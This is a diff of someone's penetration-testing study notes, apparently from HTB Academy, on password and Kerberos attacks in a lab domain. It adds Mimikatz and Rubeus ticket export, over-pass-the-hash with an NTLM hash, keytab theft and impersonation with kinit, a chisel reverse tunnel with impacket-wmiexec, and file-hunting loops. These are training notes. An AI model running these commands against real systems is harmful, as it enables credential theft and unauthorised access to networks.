@@ -9,6 +9,7 @@
 ![[Pasted image 20230513105008.png]]
 
 - Hash algorithems 
+
 | ID       | Cryptographic Hash Algorithm |
 | -------- | ---------------------------- |
 | $\1\$    | MD5                          |
@@ -77,6 +78,7 @@ msf6 > use auxiliary/scanner/smb/smb_login
 ### <span style="color:#9fef00"> Password Mutations</span>
 -----
 - Commen Passwords mistakes  via password policies
+
 | Description                            | Password Syntax |
 | -------------------------------------- | --------------- |
 | First letter is appercase              | Password        |
@@ -90,6 +92,7 @@ Based on  [WPengine](https://wpengine.com/resources/passwords-unmasked-infograp
 - Pick atleast 5 charters long that seem familiar to the user ; pets, hobbies, preferences, and other interests .
 
 - ### Hashcat mutatations example
+
 | Function | Description                                       |
 | -------- | ------------------------------------------------- |
 | :        | Do nothing.                                       |
@@ -135,6 +138,7 @@ Sauuron@htb[/htb]$ hydra -C <user_pass.list> <protocol>://<IP>
 
 ### <span style="color:#9fef00"> Attacking SAM </span>
 ----------
+
 | `Registry Hive ` | `Description`                                                                                                                                              |
 | ---------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
 | hklm\\sam        | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. |
@@ -180,7 +184,8 @@ pypykatz lsa minidump /home/peter/Documents/lsass.dmp  /* Dump from Linux machin
 
 <mark style="background: red;color:yellow">WDIGEST</mark> Authentication for old windows versions, stores credentions on plainText
 
--  [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) i
+-  [DPAPI](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection) 
+
 | Application                 | Use of DPAPI                                                                                |
 | --------------------------- | ------------------------------------------------------------------------------------------- |
 | `Internet Explorer`         | Password form auto-completion data (username and password for saved sites).                 |
@@ -193,6 +198,7 @@ pypykatz lsa minidump /home/peter/Documents/lsass.dmp  /* Dump from Linux machin
 -------
 ### <span style="color:#9fef00"> Attacking Active Directoery &  NTDS.dit </span>
 commen username naming conventions
+
 | Username Convention                 | Practical Example For Jane Jill Doe |
 | ----------------------------------- | ----------------------------------- |
 | ``firstinitiallastname``            | jdoe                                |
@@ -236,6 +242,7 @@ Sauuron@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa
 ### <span style="color:#9fef00"> Credential Hunting in windows </span>
 -------
 key Terms to Search
+
 | Passwords     | Passphrases  | keys        |
 | ------------- | ------------ | ----------- |
 | Username      | User account | Creds       |
@@ -477,8 +484,239 @@ Sauuron@htb[/htb]$ xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A
 
 Read-more : https://posts.specterops.io/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy-506c25a7c167
 
+# <span style="color:red"> Windows</span>
+--------
 ### <span style="color:#9fef00"> Pass the Ticket (PtT) From Windows </span>
 -------------
 
+- Send current timestamp hashed with user password .
+- AD knows the user hash it cna decrypt it .
+- AD sends back the user a TGT for future requests .
+- One the user has thiere ticket they don't have to prove who they're with thier password .
+- Using the TGT user requests a TGS to the KDC, to access services .
+
+To pass the ticket attack we need a valid Kerberos ticket .
+-   <mark style="background: #FF5582A6;">Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.</mark>
+-   <mark style="background: #FF5582A6;">Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.</mark>
+
+1. Get the ticket using <span style="color:#9fef00"> Mimikatz </span> and <span style="color:#9fef00"> Rebeus</span>.
+- Having Administrator access to locale machine can lead to access / creating new tickets .
+ ### <span style="color:#9fef00"> Mimikatz </span> - Export Tickets
+
+ ```css
+c:\tools> mimikatz.exe
+privilege::debug
+mimikatz # sekurlsa::tickets /export
+```
+
+**Note:** If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.
+
+<span style="color:#9fef00"> Rubeus </span> - Export Tickets
+
+```css
+c:\tools> Rubeus.exe dump /nowrap
+```
+
+
+#### OverPass the Hash or Pass the Key
+Reusing NTLM password hash that doens't touch Kerberos.
+
+#### <span style="color:#9fef00"> Mimikatz </span>  - Extract Kerberos Keys
+
+```css
+c:\tools> mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug  6 2020 14:53:43
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::ekeys
+<SNIP>
+
+Authentication Id : 0 ; 444066 (00000000:0006c6a2)
+Session           : Interactive from 1
+User Name         : plaintext
+Domain            : HTB
+Logon Server      : DC01
+Logon Time        : 7/12/2022 9:42:15 AM
+SID               : S-1-5-21-228825152-3134732153-3833540767-1107
+
+         * Username : plaintext
+         * Domain   : inlanefreight.htb
+         * Password : (null)
+         * Key List :
+           aes256_hmac       b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /* We need this */
+           rc4_hmac_nt       3f74aa8f08f712f09cd5177b5c1ce50f /* and this */
+           rc4_hmac_old      3f74aa8f08f712f09cd5177b5c1ce50f
+           rc4_md4           3f74aa8f08f712f09cd5177b5c1ce50f
+           rc4_hmac_nt_exp   3f74aa8f08f712f09cd5177b5c1ce50f
+           rc4_hmac_old_exp  3f74aa8f08f712f09cd5177b5c1ce50f
+<SNIP>
+```
+
+
+#### <span style="color:#9fef00"> Mimikatz </span> - Pass the Key or OverPass the Hash
+
+```css
+mimikatz # privilege::debug
+mimikatz # sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+```
+
+
+# <span style="color:red"> Linux</span>
+-------------
+
+#### <span style="color:#9fef00"> Pass the Ticket (PtT) from Linux </span>
+
+<mark style="background: #FF5582A6;">**Note:** A Linux machine not connected to Active Directory could use Kerberos tickets in scripts or to authenticate to the network. It is not a requirement to be joined to the domain to use Kerberos tickets from a Linux machine.</mark>
+
+- Usually Kerberos tickets stored in <span style="color:#0086ff">ccache files</span> in <span style="color:#9fef00">/tmp</span> 
+- By default, the location of Kerberos tickets are stored in the environment variable <span style="color:#9fef00"> KRB5CCNAME </span>
+- <span style="color:#0086ff"> Keytab files </span> stores Kerberos principles and encrypted keys ( Derived from kerberos passwords). Using Keytabs would guarantee access to remote services without the need for authentication 
+- Other tools used for AD intergration on linux <span style="color:#0086ff"> sssd </span> or <span style="color:#0086ff"> winbind</span>
+```powershell
+ps -ef | grep -i "winbind\|sshd"
+```
+
+
+#### Finding Keytabs Files
+
+- Find
+```powershell
+david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null
+```
+
+- Cronjob
+```shell
+carlos@inlanefreight.htb@linux01:~$ crontab -l
+
+# Edit this file to introduce tasks to be run by cron.
+# 
+<SNIP>
+# 
+# m h  dom mon dow   command
+*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
+carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
+#!/bin/bash
+
+kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt # Reqeust TGT and store in cache (ccache file).
+smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
+```
+<mark style="background: #FF5582A6;">**Note:** Ticked is represented as keytab file located by default at /etc/krb5.keytab and can be read by the root user. if we gain access to this ticket we impersonate the computer account </mark>
+
+#### Examining Environment Variables for ccache files
+
+```shell
+david@inlanefreight.htb@linux01:~$ env | grep -i krb5
+
+KRB5CCNAME=FILE:/tmp/krb5cc_647402606_qd2Pfh
+```
+
+- First usage of a kirbi ticket would be impersonating a user, we can valid the user with **klist**, **Note: ``klist`` is case-sensitive**
+
+```shell 
+klist -k -t 
+/opt/specialfiles/carlos.keytab 
+Keytab name: FILE:/opt/specialfiles/carlos.keytab
+KVNO Timestamp           Principal
+---- ------------------- ------------------------------------------------------
+   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
+```
+
+```powershell
+david@inlanefreight.htb@linux01:~$ klist # List
+
+Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
+Default principal: david@INLANEFREIGHT.HTB
+
+Valid starting     Expires            Service principal
+10/06/22 17:02:11  10/07/22 03:02:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+        renew until 10/07/22 17:02:11
+david@inlanefreight.htb@linux01:~$ kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab # Impersonate
+david@inlanefreight.htb@linux01:~$ klist # List
+Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu
+Default principal: carlos@INLANEFREIGHT.HTB
+
+Valid starting     Expires            Service principal
+10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB
+        renew until 10/07/22 17:16:11
+```
+
+
+#### Extracting Keytab Hashes with KeyTabExtract
+
+```powershell
+david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
+```
+- From here we can perform a Pass the Hash attack, or crack the NTLM hash
+
+
+### ProxyChains
+
+1. Setup chisel on the attack host
+```shell
+./chisel server --reverse -p <port-number>
+```
+
+2. Bind chisel 
+```shell
+chisel.exe client <ip>:<port-number> R:socks
+```
+
+3. Update <span style="color:#9fef00" > /etc/hosts </span>
+
+ ```shell
+ # ip from the remote host
+ 172.16.1.10  dc01.inlanefreight.htb   inlanefreight   inlanefreight.htb  dc01
+ 172.16.1.5  ms01.inlanefreight.htb  ms01
+```
+
+4. After Transferring the ticket
+
+```shell
+export KRB5CCNAME=Ticket.kirbi # export
+klist # list
+```
+
+5. Connect to DC with Impacket via ticket
+
+```shell
+proxychains impacket-wmiexec ms01 -k # -k to skip password prompt
+```
+
+### <span style="color:#9fef00" > Protected Files </span>
+
+- Encoded files https://fileinfo.com/filetypes/encoded list
+
+```shell
+ for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+```
+- Find 337 each file extension
+```shell
+Sauuron@htb[/htb]$ curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
+```
+
+### Passwords managers
+------------
+- Online
+	1. [1Password](https://1password.com/)
+	2. [Bitwarden](https://bitwarden.com/)
+	3. [Dashlane](https://www.dashlane.com/)
+	4. [Keeper](https://www.keepersecurity.com/)
+	5. [Lastpass](https://www.lastpass.com/)
+	6. [NordPass](https://nordpass.com/)
+	7. [RoboForm](https://www.roboform.com/)
+
+- Local
+	1. [KeePass](https://keepass.info/)
+	2. [KWalletManager](https://apps.kde.org/kwalletmanager5/)
+	3. [Pleasant Password Server](https://pleasantpasswords.com/)
+	4. [Password Safe](https://pwsafe.org/)
 
 
